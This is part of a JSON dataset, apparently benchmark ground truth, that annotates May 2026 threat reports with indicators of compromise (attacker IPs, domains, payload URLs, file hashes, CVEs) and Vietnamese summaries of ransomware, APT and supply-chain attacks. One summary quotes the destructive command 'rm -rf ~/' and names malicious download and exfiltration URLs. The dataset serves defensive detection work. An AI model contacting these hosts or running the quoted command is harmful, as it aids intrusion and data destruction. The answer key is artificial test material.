+    "annotator_notes": "Đã loại bỏ toàn bộ 13 chuỗi dạng X.X.X.X như 11.136.0.9, 11.102.0.41 vì đây là số hiệu phiên bản vá lỗi của cPanel/WHM và WP Squared, hoàn toàn không phải địa chỉ IPv4."
+  },
+  {
+    "index": 43,
+    "article_id": "dfir-576dbdf3",
+    "title": "Flash Alert: EtherRat and TukTuk C2 End in The Gentleman Ransomware",
+    "source_name": "The DFIR Report",
+    "published_date": "2026-05-11",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "borjumaniya.store",
+        "vefbdzzuaadnascpeqcn.supabase.co",
+        "k135neflez.westus3.azure.clickhouse.cloud",
+        "vngz3ntdrb.us-east1.gcp.clickhouse.cloud",
+        "muurfzqprzmdkzoibxaz.supabase.co",
+        "ep-lively-cherry-a80bmwii.eastus2.azure.neon.tech",
+        "witch-skins-lip-coal.trycloudflare.com",
+        "fields-pct-easier-vancouver.trycloudflare.com",
+        "howto-tar-naturals-coordination.trycloudflare.com",
+        "workshop-lighting-protective-customs.trycloudflare.com",
+        "afford-effect-construct-tricks.trycloudflare.com",
+        "rapids-lil-lending-charleston.trycloudflare.com",
+        "when-architectural-cdna-faster.trycloudflare.com",
+        "mode-exit-legendary-trusted.trycloudflare.com",
+        "seasonal-estimation-heating-necessarily.trycloudflare.com",
+        "entered-medications-motherboard-advanced.trycloudflare.com",
+        "walt-messaging-affairs-occurring.trycloudflare.com"
+      ],
+      "urls": [
+        "https://witch-skins-lip-coal.trycloudflare.com",
+        "https://fields-pct-easier-vancouver.trycloudflare.com",
+        "https://howto-tar-naturals-coordination.trycloudflare.com",
+        "https://workshop-lighting-protective-customs.trycloudflare.com",
+        "https://afford-effect-construct-tricks.trycloudflare.com",
+        "https://rapids-lil-lending-charleston.trycloudflare.com",
+        "https://when-architectural-cdna-faster.trycloudflare.com",
+        "https://mode-exit-legendary-trusted.trycloudflare.com",
+        "https://seasonal-estimation-heating-necessarily.trycloudflare.com",
+        "https://entered-medications-motherboard-advanced.trycloudflare.com",
+        "https://walt-messaging-affairs-occurring.trycloudflare.com"
+      ],
+      "md5": [
+        "73ce2438d4ed475e03727b7b000d2794",
+        "b2d51212744f404714fd909e87254d98",
+        "c92cf9a1af5b1fe25cdcb8771ce52be4",
+        "77fbe265fd65c7f7b6d323fb6de6a4fd",
+        "f985b8d6d635c266fc4779dad77aa75c",
+        "b188fbc6ff5557767e73e4c883a553a3"
+      ],
+      "sha256": [
+        "d9487fdc097f770e5661f9e5dee130068cb179d33716abff1a21c8cb901f25a6",
+        "8c2665adf8bfab65463f2a9bd1b7bb0231de3f5c1e6a2e51479e44aaac2e7bf0",
+        "4142d5efd4ea2abab77f2f0a917610e2ff976bf9e19d7ad1e9156eccdc5412db",
+        "2d4b4bb18b8445e49eeda571982874403befcecf78266e3d405f6529d98bee46",
+        "19021e53b9929fdf4b7d0e0707434d56bb73c1a9b7403c8837b44d1c417198dc",
+        "1795eacd2c58894ccdd6be8854fe6456c3b069a3a873432343b57b475b256aee"
+      ],
+      "cves": [
+        "CVE-2025-55182"
+      ],
+      "attack_behaviors": [
+        "Xâm nhập ban đầu bằng tệp MSI giả mạo tiện ích Sysinternals RAMMap (RAMMap.msi) kích hoạt MVnVmUYj.cmd tải Node.js chạy backdoor EtherRAT (trước đây từng khai thác qua React2Shell CVE-2025-55182).",
+        "EtherRAT sử dụng kỹ thuật EtherHiding truy vấn smart contract Ethereum qua 1rpc.io để lấy và cập nhật động cấu hình đường hầm TryCloudflare (11 subdomain *.trycloudflare.com) kèm domain mồi nhử.",
+        "Triển khai malware thế hệ mới TukTuk qua DLL side-loading các ứng dụng hợp pháp (Greenshot.exe, SyncTrayzor.exe, docfx.exe, Cake.exe -> log4net.dll), dùng SaaS ClickHouse, Supabase, Neon, Arweave dead-drop (Drive-Id a6278417-...) và HTTP dự phòng borjumaniya.store.",
+        "Trinh sát AD, quét mạng bằng SoftPerfect netscan.exe, di chuyển ngang bằng NetExec (nxc), dump LSASS qua comsvcs.dll, cài RMM GoTo Resolve (smokymo.msi), dùng rclone đẩy dữ liệu lên Wasabi và triển khai The Gentlemen ransomware qua GPO/SYSVOL."
+      ]
+    },
+    "annotator_notes": "Đã loại '7.2.9.0' vì đây là FileVersion của netscan.exe. Tuân theo cảnh báo của The DFIR Report, đã loại các domain SaaS dùng chung cấp root (1rpc.io, trycloudflare.com, arweave.net, wasabisys.com, gotoresolve.com) khỏi blocklist domain và chỉ giữ các tenant/subdomain cụ thể của kẻ tấn công + fallback HTTP C2 borjumaniya.store."
+  },
+  {
+    "index": 44,
+    "article_id": "thn-d5bf3a7d9f74",
+    "title": "cPanel CVE-2026-41940 Under Active Exploitation to Deploy Filemanager Backdoor",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-11",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "wrned.com",
+        "wpsock.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-41940"
+      ],
+      "attack_behaviors": [
+        "Lỗ hổng cPanel mang mã CVE-2026-41940 đang bị kẻ tấn công chủ động khai thác thực tế (under active exploitation).",
+        "Tin tặc tận dụng điểm yếu này để triển khai backdoor Filemanager (trình quản lý tệp tin trá hình) trên các máy chủ cPanel chưa được vá nhằm duy trì quyền truy cập trái phép."
+      ]
+    },
+    "annotator_notes": "Bổ sung 2 tên miền C2/phát tán của nhóm Mr_Rot13 (wrned.com, wpsock.com). Lưu ý trong bài báo gốc THN có chuỗi bị lỗi dấu ngoặc defang 'cp.dene.[de[.]com' nên không đưa vào danh sách domain chuẩn để tránh sai lệch so khớp."
+  },
+  {
+    "index": 45,
+    "article_id": "thn-a64d643b4e48",
+    "title": "Mini Shai-Hulud Worm Compromises TanStack, Mistral AI, Guardrails AI & More Packages",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-12",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "83.142.209.194"
+      ],
+      "domains": [
+        "filev2.getsession.org",
+        "api.masscan.cloud",
+        "git-tanstack.com"
+      ],
+      "urls": [
+        "https://git-tanstack.com/transformers.pyz"
+      ],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-45321"
+      ],
+      "attack_behaviors": [
+        "Nhóm TeamPCP thực hiện sâu chuỗi cung ứng Mini Shai-Hulud đầu độc hơn 170 gói npm/PyPI (TanStack, Mistral AI, Guardrails AI, OpenSearch, UiPath; gán mã CVE-2026-45321 CVSS 9.6), lạm dụng trigger pull_request_target và OIDC trên GitHub Actions (TanStack/router) để phát hành gói độc hại có chứng thực SLSA Build Level 3 hợp lệ.",
+        "Gói npm chèn tệp router_init.js đánh cắp thông tin xác thực cloud/crypto/CI, cài hook duy trì trên Claude Code và VS Code, tuồn dữ liệu ra filev2.getsession.org (Session Protocol), api.masscan.cloud, git-tanstack.com và GitHub GraphQL (tác giả claude@users.noreply.github.com).",
+        "Cài dead-man's switch kiểm tra api.github.com/user mỗi 60 giây: nếu quản trị viên thu hồi npm token, script chạy 'rm -rf ~/' xóa sạch dữ liệu nạn nhân.",
+        "Biến thể PyPI (guardrails-ai@0.10.1, mistralai@2.4.6) tải và chạy trực tiếp https://git-tanstack.com/transformers.pyz hoặc tải stealer từ 83.142.209.194 (né môi trường tiếng Nga, có nhánh phá hủy hệ thống tại Israel/Iran)."
+      ]
+    },
+    "annotator_notes": "Ghi nhận đầy đủ IP tải payload PyPI (83.142.209.194), 3 domain thu thập/phát tán của kẻ tấn công (filev2.getsession.org, api.masscan.cloud, git-tanstack.com), URL https://git-tanstack.com/transformers.pyz và CVE-2026-45321."
+  },
+  {
+    "index": 46,
+    "article_id": "securelist-2b79f73e",
+    "title": "Kimsuky targets organizations with PebbleDash-based tools",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-05-14",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "opedromos1.r-e.kr",
+        "morames.r-e.kr",
+        "load.ssangyongcne.o-r.kr",
+        "load.yju.o-r.kr",
+        "attach.docucloud.o-r.kr",
+        "load.supershop.o-r.kr",
+        "load.erasecloud.n-e.kr",
+        "cms.spaceyou.o-r.kr",
+        "erp.spaceme.p-e.kr",
+        "file.bigcloud.n-e.kr",
+        "load.auraria.org",
+        "female-disorder-beta-metropolitan.trycloudflare.com",
+        "www.pyrotech.co.kr",
+        "newjo-imd.com",
+        "www.yespp.co.kr",
+        "node896147.dwservice.net",
+        "node828765.dwservice.net",
+        "node484265.dwservice.net"
+      ],
+      "urls": [
+        "http://female-disorder-beta-metropolitan.trycloudflare.com/index.php",
+        "https://file.bigcloud.n-e.kr/index.php",
+        "https://www.yespp.co.kr/common/include/code/out.php",
+        "https://www.pyrotech.co.kr/common/include/tech/default.php",
+        "http://newjo-imd.com/common/include/library/default.php"
+      ],
+      "md5": [
+        "995a0a49ae4b244928b3f67e2bfd7a6e",
+        "52f1ff082e981cbdfd1f045c6021c63f",
+        "9fe43e08c8f446554340f972dac8a68c",
+        "8e15c4d4f71bdd9dbc48cd2cabc87806",
+        "65fc9f06de5603e2c1af9b4f288bb22c",
+        "c19aeaedbbfc4e029f7e9bdface495b9",
+        "8983ffa6da23e0b99ccc58c17b9788c7",
+        "a7f0a18ac87e982d6f32f7a715e12532",
+        "f4465403f9693939fe9c439f0ab33610",
+        "5c373c2116ab4a615e622f577e22e9be",
+        "d1ec20144c83bba921243e72c517da5e",
+        "58ac2f65e335922be3f60e57099dc8a3",
+        "f73ba062116ea9f37d072aa41c7f5108",
+        "7e0825019d0de0c1c4a1673f94043ddb",
+        "08160acf08fccecde7b34090db18b321",
+        "94faed9af49c98a89c8acc55e97276c9",
+        "c42ae004badddd3017adadbdd1421e00",
+        "9ca5f93a732f404bbb2cee848f5bbda0",
+        "678fb1a87af525c33ba2492552d5c0e2"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Nhóm APT Kimsuky phát tán tệp mồi nhử tiếng Hàn (.hwp.jse, .hwpx.jse, .pdf.jse, .scr, .pif) triển khai hàng loạt họ mã độc PebbleDash gồm AppleSeed, MemLoad, HappyDoor, httpTroy, httpMalice và HelloDoor.",
+        "Lạm dụng nhiều tên miền động miễn phí Hàn Quốc (.r-e.kr, .o-r.kr, .n-e.kr, .p-e.kr), Cloudflare Tunnel (female-disorder-beta-metropolitan.trycloudflare.com) và các website Hàn Quốc bị xâm nhập (pyrotech.co.kr, yespp.co.kr, newjo-imd.com) làm C2.",
+        "Tận dụng công cụ hợp pháp VS Code Tunnel (xác thực qua github.com/login/device, tạo tunnel https://vscode.dev/tunnel) và phần mềm điều khiển từ xa DWAgent (node896147/828765/484265.dwservice.net) để duy trì xâm nhập lén lút."
+      ]
+    },
+    "annotator_notes": "Đã loại tên miền/URL nền tảng hợp pháp (microsoft.com, github.com, vscode.dev, www.dwservice.net) và chỉ giữ 5 URL + 18 node/tunnel/DDNS/C2 cụ thể cùng 19 MD5 trong bảng IOC."
+  },
+  {
+    "index": 47,
+    "article_id": "thn-447fec50ca10",
+    "title": "On-Prem Microsoft Exchange Server CVE-2026-42897 Exploited via Crafted Email",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-15",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-42897"
+      ],
+      "attack_behaviors": [
+        "Khai thác lỗ hổng bảo mật trên máy chủ Microsoft Exchange Server dạng tại chỗ (On-Premises) mang mã CVE-2026-42897.",
+        "Sử dụng các email được thiết kế đặc biệt (crafted email) gửi đến máy chủ mục tiêu để kích hoạt lỗ hổng và thực thi các hành vi độc hại từ xa."
+      ]
+    },
+    "annotator_notes": "Lỗ hổng nghiêm trọng ảnh hưởng trực tiếp đến các hệ thống email Exchange Server tự triển khai tại doanh nghiệp."
+  },
+  {
+    "index": 48,
+    "article_id": "thn-597ec3e36639",
+    "title": "Four Malicious npm Packages Deliver Infostealers and Phantom Bot DDoS Malware",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-18",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "80.200.28.28"
+      ],
+      "domains": [
+        "87e0bbc636999b.lhr.life",
+        "edcf8b03c84634.lhr.life"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát hiện 4 gói phần mềm độc hại trên kho lưu trữ npm chuyên phân phối các dòng mã độc đánh cắp thông tin (infostealers) và botnet DDoS mang tên Phantom Bot.",
+        "Lợi dụng sự tin tưởng của nhà phát triển khi cài đặt các thư viện npm để lén lút tải và kích hoạt payload độc hại trên hệ thống."
+      ]
+    },
+    "annotator_notes": "Bổ sung IP C2 80.200.28.28 (cổng 2222) và 2 subdomain tunnel cụ thể trên localhost.run (*.lhr.life) được nhóm npm độc hại (@deadcode09284814) dùng để tuồn dữ liệu đánh cắp."
+  },
+  {
+    "index": 49,
+    "article_id": "securelist-29b580f5",
+    "title": "Cloud Atlas activity in the second half of 2025 and early 2026: new tools and a new payload",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-05-22",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "194.102.104.207",
+        "46.17.45.56",
+        "46.17.45.49",
+        "46.17.44.125",
+        "46.17.44.212",
+        "185.22.154.73",
+        "194.87.196.163",
+        "195.58.49.9",
+        "93.125.114.193",
+        "93.125.114.57",
+        "45.87.219.116",
+        "37.228.129.224",
+        "185.53.179.136",
+        "185.126.239.77",
+        "5.181.21.75",
+        "146.70.53.171",
+        "45.15.65.134",
+        "185.250.181.207",
+        "81.30.105.71"
+      ],
+      "domains": [
+        "tenkoff.org",
+        "cloudguide.in",
+        "goverru.com",
+        "kufar.org",
+        "ultimatecore.net",
+        "spbnews.net",
+        "onedrivesupport.net",
+        "amerikastaj.com",
+        "bigbang.me",
+        "paleturquoise-dragonfly-364512.hostingersite.com",
+        "wizzifi.com",
+        "totallegacy.org",
+        "mamurjor.com",
+        "landscapeuganda.com",
+        "lafortunaitalian.co.uk",
+        "kommando.live",
+        "internationalcommoditiesllc.com",
+        "humanitas.si",
+        "fishingflytackle.com",
+        "firsai.tipshub.net",
+        "alnakhlah.com.sa",
+        "allgoodsdirect.com.au",
+        "agenciakharis.com.br",
+        "istochnik.org",
+        "znews.neti",
+        "investika-club.com"
+      ],
+      "urls": [],
+      "md5": [
+        "1A11B26DD0261EF27A112CE8B361C247",
+        "5329F7BFF9D0D5DB28821B86C26D628F",
+        "7A95360B7E0EB5B107A3D231ABBC541A",
+        "C0D1EAA15A2CEFBAB9735787575C8D8E",
+        "D5B38B252CF212A4A32763DE36732D40",
+        "3C75CEDB1196DF5EAB91F31411ED4B33",
+        "42AC350BFBC5B4EB0FEDBA16C81919C7",
+        "493B901D1B33EB577DB64AADD948F9CE",
+        "2CABB721681455DAE1B6A26709DEF453",
+        "1B39E86EB772A0E40060B672B7F574F1",
+        "1D401D6E6FC0B00AAA2C65A0AC0CFD6B",
+        "40A562B8600F843B717BC5951B2E3C29",
+        "F721A76DEB28FD0B80D27FCE6B8F5016",
+        "D3C8AFD22BAA306FF659DB1FAC28574A",
+        "6D7B2D1172BBDB7340972D844F6F0717",
+        "9769F43B9DE8D19E803263267FA6D62E",
+        "63B6BE9AE8D8024A40B200CCCB438F1D",
+        "6AA586BCC45CA2E92A4F0EF47E086FA1",
+        "EBA3BCDB19A7E256BF8E2CC5B9C1CCA9",
+        "B4E183627B7399006C1BC47B3711E419",
+        "F56B31A4B47AD3365B18A7E922FBA1A8",
+        "F6F62456FB0FCC396FB654CBED339BC3",
+        "25C8ED0511375DCA57EF136AC3FA0CCA",
+        "2B4BA4FACF8C299749771A3A4369782E",
+        "BA9CE06641067742F2AFC9691FAFF1DC",
+        "FB0F8027ACF1B1E47E07A63D8812ED50",
+        "BBF1FA694122E07635DEEAC11AD712F8",
+        "F301AA3D62B5095EEC4D8E34201A4769",
+        "F9C3BBE108566D1A6B070F9C5FB03160",
+        "369B75BDCDED16469EDE7AB8BEDCFAE1",
+        "9EAAE9491F6A50D6DF0BE393734A44CB",
+        "3E6E9DF00A764B348EC611EE8504ACA0",
+        "9BD788F285E32A05E6591D1EB36EBFFC",
+        "F42085522EC2EBB16EDCF814E7C330AD",
+        "2042EB5D52F0B535A1CE6B6F954C8C2B",
+        "2AA1E9765EF6B00B94A9B6BE0041436A",
+        "36120F5E9411BCBAC7104EF3FA964ED2",
+        "5000A353399500BC78381DC95B6ED2DC",
+        "579A9952D31CAD801A3988DBE7914CE7",
+        "867B634588C0FD6B26684D502C15AB03",
+        "38FA4306FA4406BA31CF171AF4D36E34",
+        "83EDDE9F7EEEFAC0363413972F35572B",
+        "CC751619BFEC0DC4607C17112B9E3B2C",
+        "A632858F14B36F03D0F213F5F5D6BFF2",
+        "097CA205AD9E3B72018750280904718C",
+        "69121C36EB8BF77962DCA825FCFFD873",
+        "C5702EB250F855C8C872FFFB9BB656ED",
+        "ED34F5A136FBA4FDEA976570FAA33ED7",
+        "0577DB70844E88B32B954906E2F20798",
+        "28ECF8FB6719E14231B94B4D37629B0E",
+        "0857C84B62289A1A9F29E19244E9A499",
+        "0C514E137860F489E3801213460EF938",
+        "50568B1F9335A7E3BA4E5DF035A8FB86",
+        "7F776AD200287D6DE14A29158C457179",
+        "51F7F794ED43FB90D0F8EBBB5EFFE628",
+        "B8C753DD254509FBA5077FFD5067EAB0",
+        "BC3739DEC8CD8F54F3F60A85F3ED600E",
+        "EC076CD21C483A40156F4E40D08DADED",
+        "216CB7F31D383C0DD892B284DF05A495",
+        "116F59E70A9DF97F4ADAEA71EECB1E9A",
+        "7242AC065B50BCDE9308756B49DBADCB",
+        "8158552950D2E13B075001CE0C52AA97",
+        "A75DBED984963B9AB21309C5B2F8FD9B",
+        "0320DD389FDBAB25D46792BD2817675E",
+        "5339D1A666F3E40FE756505CF1D87D4B",
+        "67D7E3AEEB673BF60C59361C12A4ED81",
+        "89572F0ED20791A5AC9FC4267D67CCB0",
+        "B6AAE073E7BFEBF4D643C2BBEB5C02E1",
+        "344CA9EA07CD4AC90EF27F8890D4EC05"
+      ],
+      "sha256": [],
+      "cves": [
+        "CVE-2018-0802"
+      ],
+      "attack_behaviors": [
+        "Nhóm APT Cloud Atlas sử dụng tài liệu Microsoft Office độc hại chèn template từ xa và khai thác lỗ hổng Equation Editor cũ (CVE-2018-0802) để thực thi chuỗi VBS/HTA/PowerShell.",
+        "Triển khai backdoor mới PowerCloud (cùng tiện ích thu thập Browser checker, công cụ proxy ReverseSocks và Tor client giả dạng tệp hệ thống trong C:\\Windows\\INF, C:\\Windows\\ime, C:\\Windows\\PLA).",
+        "Duy trì bền vững qua hàng loạt script VBS (WriteToSchedulerKillSSH.vbs, Create_task_day.vbs, WriteToSchedulerGenerateKey.vbs...) tạo Scheduled Task chạy kết nối Reverse SSH/Socks tới 7 domain C2 và dàn 19 IP staging PowerShell."
+      ]
+    },
+    "annotator_notes": "Bao gồm 69 MD5 (PowerCloud, Browser checker, ReverseSocks, tài liệu Office độc hại), 19 IP PowerShell staging và 26 tên miền thuộc 3 nhóm trong báo cáo Kaspersky (Reverse SSH/Socks, domain bị chiếm/độc hại dùng trong MS Office template, và PowerShell staging; giữ nguyên chuỗi 'znews.neti' đúng như văn bản gốc của Kaspersky)."
+  },
+  {
+    "index": 50,
+    "article_id": "thn-183ac3ea8a40",
+    "title": "Megalodon GitHub Attack Targets 5,561 Repos with Malicious CI/CD Workflows",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-22",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "216.126.225.129"
+      ],
+      "domains": [
+        "polymarketbot.polymarketdev.workers.dev"
+      ],
+      "urls": [
+        "https://polymarketbot.polymarketdev.workers.dev/v1/wallets/keys"
+      ],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Chiến dịch tấn công diện rộng mang tên Megalodon nhắm vào 5.561 kho lưu trữ (repositories) trên GitHub.",
+        "Tiêm các tệp quy trình CI/CD độc hại (malicious CI/CD workflows) tự động hóa để thao túng quá trình builds, đánh cắp token hoặc phát tán mã độc từ kho lưu trữ bị chiếm đoạt."
+      ]
+    },
+    "annotator_notes": "Bổ sung IP C2 chiến dịch Megalodon (216.126.225.129:8443) cùng subdomain Cloudflare Worker cụ thể và URL thu thập khóa ví của chiến dịch Polymarket CLI độc hại được mô tả cuối bài."
+  }
+]
